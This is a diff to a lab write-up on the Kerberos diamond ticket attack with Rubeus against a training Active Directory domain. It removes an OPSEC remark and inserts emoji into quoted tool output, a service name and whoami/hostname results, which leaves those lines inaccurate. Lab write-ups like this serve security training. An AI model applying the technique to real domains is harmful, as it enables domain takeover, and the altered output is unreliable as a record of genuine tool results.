@@ -11,7 +11,7 @@
 1. **Use domain admin privileges obtained earlier (see *Learning Objective 08*) to execute the diamond ticket attack**
 
 We can simply use the following Rubeus command to execute the attack.
-Note that the command needs to be run **from an elevated shell ('run as administrator')**. We take the usual OPSEC care of using Loader.
+Note that the command needs to be run **from an elevated shell ('run as administrator')**.
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
@@ -56,7 +56,7 @@ In order to perform the diamond ticket attack we need to use the `krbtgt` aes256
 [+] LUID            : 0x626d5a
 
 [*] No target SPN specified, attempting to build 'cifs📌/dc.domain.com'
-[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/dcorp-dc.dollarcorp.moneycorp.local'
+[*] Initializing Kerberos GSS-API📌 w/ fake delegation for target 'cifs/dcorp-dc.dollarcorp.moneycorp.local'
 [+] Kerberos GSS-API initialization success!
 [+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
 [*] Found the AP-REQ delegation ticket in the GSS-API output.
@@ -124,12 +124,12 @@ C:\Users\Administrator>
 
 `whoami`:
 ```
-dcorp\administrator
+dcorp\administrator👤
 ```
 
 `hostname`:
 ```
-dcorp-dc
+dcorp-dc🖥️
 ```
 🚩
 
